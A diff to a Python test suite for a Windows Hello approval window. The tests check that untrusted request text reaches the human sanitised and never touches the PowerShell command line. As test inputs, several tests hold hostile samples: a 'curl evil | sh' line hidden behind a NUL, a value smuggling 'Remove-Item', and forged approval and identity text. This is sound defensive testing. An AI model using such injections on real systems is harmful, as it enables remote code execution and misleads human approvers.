@@ -16,7 +16,6 @@ from __future__ import annotations
 import base64
 import json
 import os
-import resource
 import sys
 import time
 
@@ -225,6 +224,7 @@ def test_a_silent_call_ends_at_its_deadline_with_its_whole_group(fake, monkeypat
 def test_a_flood_is_cut_at_the_output_cap_cheaply(fake):
     """A far side printing without end: cut at `OUTPUT_CAP`, ended, and
     measured — the caller's CPU for the whole exchange and its memory."""
+    resource = pytest.importorskip("resource")
     fake.plan(pubkey="flood")
     before = resource.getrusage(resource.RUSAGE_SELF)
     began = time.monotonic()
@@ -256,7 +256,7 @@ def test_approve_signs_the_challenge_and_only_approve_does(fake):
     sig = base64.b64encode(REAL_SIGNATURE).decode()
     fake.plan(window={"status": "Success", "choice": "approve"},
               sign={"status": "Success", "signature": sig})
-    result = hello.open(_request())
+    result = hello.open_window(_request())
     assert result == {"choice": "approve", "method": "hello", "cred_id": "collab-alice",
                       "signature_b64": sig}
     signed = [c["req"] for c in fake.calls() if c["req"]["op"] == "sign"]
@@ -265,29 +265,35 @@ def test_approve_signs_the_challenge_and_only_approve_does(fake):
                              ("anything", "decline")):
         fake.plan(window={"status": "Success", "choice": choice})
         before = len([c for c in fake.calls() if c["req"]["op"] == "sign"])
-        assert hello.open(_request())["choice"] == expected
+        assert hello.open_window(_request())["choice"] == expected
         assert len([c for c in fake.calls() if c["req"]["op"] == "sign"]) == before
 
 
 def test_a_cancelled_gesture_after_approve_is_a_decline(fake):
     fake.plan(window={"status": "Success", "choice": "approve"},
               sign={"status": "UserCanceled"})
-    assert hello.open(_request()) == {"choice": "decline", "reason": "Refused"}
+    assert hello.open_window(_request()) == {"choice": "decline", "reason": "Refused"}
 
 
-def test_a_window_that_breaks_or_hangs_approves_nothing(fake, monkeypatch):
-    monkeypatch.setattr(hello, "HUMAN", 1.5)
+def test_a_window_that_breaks_or_hangs_approves_nothing_and_decides_nothing(
+        fake, monkeypatch):
+    """Nobody chose: the request EXPIRES. The window could not be shown: it is
+    unavailable. Neither is «declined», which would be a decision nobody made
+    — and neither is ever an approval."""
+    monkeypatch.setattr(hello, "WINDOW_DEADLINE", 1.5)
     fake.plan(window="silent")
-    assert hello.open(_request())["choice"] == "decline"
+    assert hello.open_window(_request()) == {"choice": "expired"}
     fake.plan(window="garbage")
-    assert hello.open(_request())["choice"] == "decline"
+    assert hello.open_window(_request())["choice"] == "unavailable"
+    fake.plan(window={"status": "Error", "error": "Win32Exception"})
+    assert hello.open_window(_request())["choice"] == "unavailable"
     monkeypatch.setattr(hello, "_powershell", lambda: None)
-    assert hello.open(_request()) == {"choice": "unavailable", "reason": "NoPowerShell"}
+    assert hello.open_window(_request()) == {"choice": "unavailable", "reason": "NoPowerShell"}
 
 
 def test_no_key_enrolled_is_unavailable_so_the_dispatcher_can_offer_a_passkey(fake):
     fake.plan(window={"status": "Success", "choice": "approve"}, sign={"status": "NotFound"})
-    assert hello.open(_request()) == {"choice": "unavailable", "reason": "NotEnrolled"}
+    assert hello.open_window(_request()) == {"choice": "unavailable", "reason": "NotEnrolled"}
 
 
 def test_the_window_shows_the_review_as_untrusted_text_with_a_bounded_summary(fake):
@@ -297,12 +303,100 @@ def test_the_window_shows_the_review_as_untrusted_text_with_a_bounded_summary(fa
     marked untrusted and bounded, and it travels on stdin, not the command
     line."""
     fake.plan(window={"status": "Success", "choice": "decline"})
-    hello.open(_request(requester_name="bob\nAPPROVED BY ADMIN\x1b[2J",
+    hello.open_window(_request(requester_name="bob\nAPPROVED BY ADMIN\x1b[2J",
                         review_text="x" * (hello.REVIEW_MAX + 500)))
     call = fake.calls()[-1]
     sent = call["req"]
-    assert "\n" not in sent["who"] and "\x1b" not in sent["who"]
+    for line in (sent["requester"], sent["name"], sent["summary"]):
+        assert "\n" not in line and "\x1b" not in line
     assert sent["review"].startswith("UNTRUSTED")
     assert len(sent["review"]) < hello.REVIEW_MAX + 200
-    assert "xxxx" not in " ".join(call["argv"])
+    # THE COMMAND LINE IS THE FIXED SCRIPT AND NOTHING ELSE: decoded, it is
+    # exactly `_SCRIPT`, so no request text can have reached it.
+    argv = call["argv"]
+    encoded = argv[argv.index("-EncodedCommand") + 1]
+    assert base64.b64decode(encoded).decode("utf-16-le") == hello._SCRIPT
     assert "digest abababababababab" in sent["summary"]
+
+
+def test_controls_and_invisible_characters_are_shown_not_obeyed(fake):
+    """WinForms stops drawing a TextBox at a NUL: «make test\\0; curl evil | sh»
+    showed only «make test». Every control and format character — NUL, the
+    bidi overrides and isolates, zero-width characters, the BOM — is shown as
+    a visible \\u{XXXX}, in the review and in the lines above it."""
+    fake.plan(window={"status": "Success", "choice": "decline"})
+    hello.open_window(_request(
+        review_text="make test\x00; curl evil | sh",
+        requester_name="bob\u202e)ecila(\u2066x\u2069\u200b\ufeff"))
+    sent = fake.calls()[-1]["req"]
+    assert "\\u{0000}; curl evil | sh" in sent["review"]
+    assert "\x00" not in sent["review"]
+    for char in ("\u202e", "\u2066", "\u2069", "\u200b", "\ufeff"):
+        assert char not in sent["name"]
+    assert "\\u{202E}" in sent["name"] and "\\u{2066}" in sent["name"]
+
+
+def test_the_hub_assigned_id_is_its_own_first_line_and_the_name_is_marked(fake):
+    """A name chosen to read «alice (p_alice) asks for approval ⸻…» pushed the
+    real id off a wrapped label. The id is the first line on its own; the
+    name follows, marked as the requester's own choice."""
+    fake.plan(window={"status": "Success", "choice": "decline"})
+    hello.open_window(_request(requester_id="p_bob",
+                               requester_name="alice (p_alice) asks for approval " + "⸻" * 80))
+    sent = fake.calls()[-1]["req"]
+    assert sent["requester"].startswith("Requester: p_bob")
+    assert "assigned by the hub" in sent["requester"]
+    assert sent["name"].startswith("Calls itself: alice") and sent["name"].endswith("(self-chosen)")
+    assert "p_alice" not in sent["requester"]
+
+
+def test_a_request_that_could_not_be_signed_never_reaches_a_human(fake):
+    """The key name and the challenge are checked BEFORE the window: a human
+    must not read and approve something that cannot then be signed."""
+    for bad in ({"cred_id": "x'; Remove-Item"}, {"challenge_b64": "not base64!"},
+                {"challenge_b64": ""}, {"cred_id": None}):
+        assert hello.open_window(_request(**bad)) == {"choice": "unavailable",
+                                                      "reason": "BadRequest"}
+    assert fake.calls() == []
+
+
+def test_a_child_that_never_reads_cannot_stretch_the_deadline(tmp_path, monkeypatch):
+    """The deadline used to start after a blocking stdin write; a child that
+    never read its stdin held the caller for 30 s against a 2 s deadline. The
+    clock starts before the process, and the write is on a thread."""
+    exe = tmp_path / "powershell.exe"
+    exe.write_text(f"#!{sys.executable}\nimport time\ntime.sleep(60)\n")
+    exe.chmod(0o755)
+    monkeypatch.setattr(hello, "_powershell", lambda: str(exe))
+    monkeypatch.setattr(hello, "WINDOW_DEADLINE", 1.5)
+    began = time.monotonic()
+    result = hello.open_window(_request(review_text="r" * (hello.REVIEW_MAX - 100)))
+    took = time.monotonic() - began
+    assert result == {"choice": "expired"}
+    assert took < 5, f"{took:.1f} s"
+
+
+POWERSHELL = hello._powershell()
+
+
+@pytest.mark.skipif(POWERSHELL is None, reason="needs Windows PowerShell")
+def test_the_real_script_parses_and_its_window_builds_without_showing():
+    """Against the real powershell.exe, with nothing on the screen: the fixed
+    script parses with no errors, and the approval window is BUILT from a
+    request — controls, labels, a hostile review — and disposed of unshown."""
+    import subprocess
+
+    check = (
+        "$src = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("
+        "[Console]::In.ReadLine()))\n"
+        "$t = $null; $e = $null\n"
+        "[void][System.Management.Automation.Language.Parser]::ParseInput($src, [ref]$t, [ref]$e)\n"
+        "\"errors=$($e.Count)\"\n")
+    out = subprocess.run(
+        [POWERSHELL, "-NoProfile", "-NonInteractive", "-EncodedCommand",
+         base64.b64encode(check.encode("utf-16-le")).decode()],
+        input=base64.b64encode(hello._SCRIPT.encode()) + b"\n",
+        capture_output=True, timeout=60)
+    assert b"errors=0" in out.stdout, out.stdout
+    built = hello.build_window_only(_request(review_text="make test\x00; curl evil | sh"))
+    assert built["choice"] == "built"
